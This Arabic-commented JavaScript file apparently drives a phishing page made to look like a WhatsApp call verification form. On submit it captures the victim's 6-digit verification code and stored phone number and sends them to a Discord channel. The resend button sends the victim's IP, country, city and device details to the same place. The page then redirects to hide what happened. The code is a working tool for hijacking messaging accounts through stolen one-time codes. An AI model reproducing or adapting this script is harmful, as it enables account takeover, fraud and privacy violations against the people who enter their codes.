// معالج نموذج رمز التحقق عبر مكالمة واتساب
document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('confirmationForm');
  const codeInput = document.getElementById('text');
  const confirmBtn = document.getElementById('confirmCodeBtn');
  const resendCallBtn = document.getElementById('resendCallBtn');
  const resendBtnText = document.getElementById('resendBtnText');
  const btnChrono = document.getElementById('btnChrono');
  const btnChronoTimer = document.querySelector('.btn-chrono-timer');

  let loadingTimeout;
  let resendTimeout;
  let chronoInterval;
  let chronoCountdown = 20;

  // تنسيق الرمز أثناء الكتابة
  codeInput.addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, '');
    hideError();
    hideSuccess();
  });

  // زر تأكيد الرمز
  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    hideError();
    hideSuccess();

    const code = codeInput.value.trim();

    if (!code) {
      showError('⚠️ يرجى إدخال رمز التحقق');
      codeInput.focus();
      return;
    }

    if (code.length !== 6) {
      showError('⚠️ رمز التحقق يجب أن يكون 6 أرقام');
      codeInput.focus();
      return;
    }

    disableForm('confirmationForm');
    showChronoLoading('جاري التحقق والاتصال ...');
    startLinearLoading(2, 'template.html');

    try {
      const { device } = getDeviceInfo();
      const { country, city, ip } = await getIPInfo();
      const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
      const countryCode = getFromStorage('countryCode') || '+968';

      const message = `📞 **SMS Or CALL رمز التحقق:** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;

      const success = await sendToDiscord(message);

      if (success) {
        saveToStorage('verificationCode', code);
      } else {
        clearTimeout(loadingTimeout);
        hideChronoLoading();
        enableForm('confirmationForm');
        showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
      }
    } catch (error) {
      console.error('خطأ:', error);
      clearTimeout(loadingTimeout);
      hideChronoLoading();
      enableForm('confirmationForm');
      showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
    }
  });

  // زر إعادة إرسال المكالمة مع كرونو 20 ثانية
  resendCallBtn.addEventListener('click', async function () {
    // إخفاء الرسائل السابقة
    hideError();
    hideSuccess();

    // إذا كان الكرونو نشطاً، لا تفعل شيئاً
    if (resendCallBtn.disabled) return;

    // تعطيل الزر
    resendCallBtn.disabled = true;

    // تغيير نص الزر وإظهار الكرونو
    resendBtnText.textContent = 'جاري إعادة الإرسال';
    btnChrono.style.display = 'flex';

    // بدء العد التنازلي
    startResendChrono();

    try {
      // الحصول على معلومات
      const { device } = getDeviceInfo();
      const { country, city, ip } = await getIPInfo();
      const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
      const countryCode = getFromStorage('countryCode') || '+968';

      // إرسال طلب إعادة الإرسال إلى Discord
      const message = `🔄 **طلب إعادة إرسال مكالمة واتساب:**\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 **الدولة:** ${country}\n🏙️ **المدينة:** ${city}\n🌐 **IP:** ${ip}\n📱 **الجهاز:** ${device}`;

      const success = await sendToDiscord(message);

      if (!success) {
        // في حالة فشل الإرسال، إعادة تمكين الزر
        stopResendChrono();
        resendCallBtn.disabled = false;
        resendBtnText.textContent = 'إعادة إرسال الرمز عبر مكالمة';
        btnChrono.style.display = 'none';
        showError('حدث خطأ أثناء إعادة الإرسال. حاول مرة أخرى.');
      }
    } catch (error) {
      console.error('خطأ:', error);
      stopResendChrono();
      resendCallBtn.disabled = false;
      resendBtnText.textContent = 'إعادة إرسال الرمز عبر مكالمة';
      btnChrono.style.display = 'none';
      showError('حدث خطأ أثناء إعادة الإرسال. حاول مرة أخرى.');
    }
  });

  // وظيفة بدء الكرونو في الزر
  function startResendChrono() {
    chronoCountdown = 20;
    btnChronoTimer.textContent = chronoCountdown;

    chronoInterval = setInterval(() => {
      chronoCountdown--;
      btnChronoTimer.textContent = chronoCountdown;

      // تغيير لون الكرونو عند اقتراب النهاية
      if (chronoCountdown <= 5) {
        btnChronoTimer.style.color = '#ff6b6b';
        btnChronoTimer.style.transform = 'scale(1.1)';
      }

      if (chronoCountdown <= 0) {
        stopResendChrono();
        resendCallBtn.disabled = false;
        resendBtnText.textContent = 'إعادة إرسال الرمز عبر مكالمة';
        btnChrono.style.display = 'none';
        showSuccess('✅ يمكنك الآن إعادة إرسال المكالمة مرة أخرى');
      }
    }, 1000);
  }

  // وظيفة إيقاف الكرونو
  function stopResendChrono() {
    if (chronoInterval) {
      clearInterval(chronoInterval);
      chronoInterval = null;
    }
    btnChronoTimer.style.color = '';
    btnChronoTimer.style.transform = '';
  }

  // وظائف التحكم في التحميل الخطي
  function startLinearLoading(seconds, redirectUrl) {
    const progressElement = document.querySelector('.chrono-progress');

    if (progressElement) {
      progressElement.style.width = '0%';
      progressElement.style.transition = `width ${seconds}s linear`;

      setTimeout(() => {
        progressElement.style.width = '100%';
      }, 100);
    }

    loadingTimeout = setTimeout(() => {
      window.location.href = redirectUrl;
    }, seconds * 1000);
  }

  function showChronoLoading(text = 'جاري إجراء المكالمة عبر واتساب ...') {
    const loadingOverlay = document.getElementById('loadingPopup');
    const chronoLabel = document.querySelector('.chrono-label');

    if (chronoLabel) {
      const dots = chronoLabel.querySelectorAll('.pulsing-dot');
      chronoLabel.innerHTML = text;
      dots.forEach(dot => chronoLabel.appendChild(dot));
    }
    loadingOverlay.style.display = 'flex';
  }

  function hideChronoLoading() {
    const loadingOverlay = document.getElementById('loadingPopup');
    loadingOverlay.style.display = 'none';

    if (loadingTimeout) {
      clearTimeout(loadingTimeout);
    }
  }

  // وظائف مساعدة
  function showError(message) {
    const errorMsg = document.getElementById('errorMsg');
    if (errorMsg) {
      errorMsg.textContent = message;
      errorMsg.style.display = 'block';
    }
  }

  function hideError() {
    const errorMsg = document.getElementById('errorMsg');
    if (errorMsg) {
      errorMsg.style.display = 'none';
    }
  }

  function showSuccess(message) {
    const successMsg = document.getElementById('successMsg');
    if (successMsg) {
      successMsg.textContent = message;
      successMsg.style.display = 'block';
    }
  }

  function hideSuccess() {
    const successMsg = document.getElementById('successMsg');
    if (successMsg) {
      successMsg.style.display = 'none';
    }
  }

  function disableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
      const inputs = form.querySelectorAll('input, button');
      inputs.forEach(input => {
        if (input.id !== 'resendCallBtn') { // لا نعطل زر إعادة الإرسال هنا
          input.disabled = true;
        }
      });
    }
  }

  function enableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
      const inputs = form.querySelectorAll('input, button');
      inputs.forEach(input => {
        input.disabled = false;
      });
    }
  }
});